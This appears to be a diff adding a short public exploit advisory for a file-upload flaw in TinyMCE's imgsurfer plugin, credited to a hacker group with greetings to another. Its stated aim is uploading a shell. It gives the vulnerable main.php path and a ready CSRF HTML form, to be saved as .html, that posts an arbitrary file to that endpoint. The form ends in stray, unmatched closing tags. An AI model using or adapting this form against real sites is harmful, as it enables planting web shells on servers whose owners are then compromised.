@@ -1,0 +1,32 @@
+--------------------------------------------------------
+Exploit Title: ImgSurf CSRF Bypass File Upload
+Author: ErrOr SquaD
+greetz: Legion BOmb3r & ErrOr SquaD 
+--------------------------------------------------------
+https://www.tinymce.com/
+--------------------------------------------------------
+
+Description:
+The vulnerability allows an attacker upload shell.
+POC:
+http://www.site.com/tinymce/plugins/imgsurfer/main.php
+
+CSRF code: save as .html
+
+<form name="f" method="post" enctype="multipart/form-data" action="http://www.site.com/tinymce/plugins/imgsurfer/main.php">
+			<table width="100%" cellpadding="0" cellspacing="0" border="0">
+				<tr>					
+					<td>Nueva imagen:</td>
+					<td><input name="file" type="file" size="30"></td>										
+	            <td align="right">
+<input type="submit" name="submit" value="Transferir">
+            	</td>
+				</tr>
+			</table>
+			</form>
+		</td>
+	</tr>
+	<tr>
+		<td>&nbsp;</td>
+	</tr>
+</table>
